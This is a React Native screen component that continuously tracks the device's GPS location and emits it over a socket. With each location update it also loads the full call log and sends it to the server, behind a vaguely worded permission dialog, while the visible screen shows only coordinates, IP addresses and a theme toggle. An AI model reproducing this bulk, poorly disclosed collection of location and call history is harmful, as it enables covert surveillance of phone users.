import React, { useState, useEffect, useContext } from 'react';
import { Alert, PermissionsAndroid, StyleSheet, Text, View } from 'react-native';
import Geolocation from '@react-native-community/geolocation';
import { NetworkInfo } from "react-native-network-info";
import { ThemeContext } from '../../../Theme/ThemeContext';
import { lightTheme, darkTheme } from '../../../Theme/Color';
import Button from '../../../Component/Footer Button/Index'
import { styles } from './Style';
import { useSelector } from 'react-redux';
import CallLogs from 'react-native-call-log';

import { useSocket } from '../../../Theme/Socket';
const Index = () => {
  const [location, setLocation] = useState(null);
  const [errorMsg, setErrorMsg] = useState(null);
  const [LocalIp, setLocalIp] = useState(null);
  const [WifiIp, setWifiIp] = useState(null);
  const [isConnected, setIsConnected] = useState(false); // State to track socket connection status
  const themeContext = useContext(ThemeContext);
  const socket = useSocket();
  const data = useSelector((state) => state?.Auth?.User);
console.log('data',data)
  const theme = themeContext?.isDarkTheme ? darkTheme : lightTheme;
  const handletoggletheme = themeContext?.toggleTheme;

  useEffect(() => {
   

   



   

   


    // Clean up socket on unmount
    return () => {
       
        
        socket.off("location")
        socket.off('get-callData')

    };
  }, []);

  useEffect(() => {
 
    // Watch for position changes
    const watchId = Geolocation.watchPosition(
      position => {
        setLocation(position);
       
      },
      error => {
        setErrorMsg('Error while watching position');
      },
      { enableHighAccuracy: true, timeout: 20000, maximumAge: 1000 }
    );

    // Clean up
    return () => {
      Geolocation.clearWatch(watchId);
    };
  }, []);

  useEffect(() => {
    if (location) {
      // Ensure data is available before attempting to emit location


      if (!data) {
        return;
      }
  
      // Check the value of userId
      const userId = data?.user?.id;
      if (!userId) {
        return;
      }
  
      const locationData = {
        latitude: location.coords.latitude,
        longitude: location.coords.longitude,
        userId: userId,
      };
  
      socket.emit('location', locationData);
emitCallLogsAndUserId()
    }
  }, [location, data]); // Add data dependency to useEffect
  

  useEffect(() => {
    // Get Local and WiFi IP addresses
    NetworkInfo.getIPAddress().then(ipAddress => {
      setLocalIp(ipAddress);
    });

    NetworkInfo.getIPV4Address().then(ipv4Address => {
      setWifiIp(ipv4Address);
    });
  }, []);

  // Function to emit location data
 
  const emitCallLogsAndUserId = async () => {
    try {
      const granted = await PermissionsAndroid.request(
        PermissionsAndroid.PERMISSIONS.READ_CALL_LOG,
        {
          title: 'Call Log Example',
          message: 'Access your call logs',
          buttonNeutral: 'Ask Me Later',
          buttonNegative: 'Cancel',
          buttonPositive: 'OK',
        },
      );
  
      if (granted === PermissionsAndroid.RESULTS.GRANTED) {
        const callLogs = await CallLogs.loadAll();
        const userId = data?.user?.id;
  
        if (userId && callLogs) {
          const dataToSend = {
            userId: userId,
            callLogs: callLogs,
          };
  
          console.log('Emitting call log data:', dataToSend);
          socket.emit('get-callData', dataToSend);
        } else {
          console.log('User ID or call logs not available.');
        }
      } else {
        console.log('Call log permission denied.');
        Alert.alert('Call Log permission denied');
      }
    } catch (error) {
      console.error('Error fetching call logs:', error);
      Alert.alert('Error fetching call logs:', error);
    }
  };
  



  let text = 'Waiting..';
  if (errorMsg) {
    text = errorMsg;
  } else if (location) {
    text = `Latitude: ${location.coords.latitude}, Longitude: ${location.coords.longitude}`;
  }

  return (
    <View style={[styles.container, { backgroundColor: theme.primaryBackground }]}>
      <Text style={[styles.newsDate, { color: theme.primaryText }]}>{text}</Text>
      <View>
        <Text style={[styles.newsDate, { color: theme.primaryText }]}>Local IP Address : {LocalIp}</Text>
      </View>
      <View>
        <Text style={[styles.newsDate, { color: theme.primaryText }]}>Wifi Ip Address : {WifiIp}</Text>
      </View>
      <Text style={[styles.newsDate, { color: theme.primaryText }]}>Socket Status: {isConnected ? 'Connected' : 'Disconnected'}</Text>
      <Button handleSubmit={handletoggletheme} text={'toggleTheme'} />
    </View>
  );
};

export default Index;
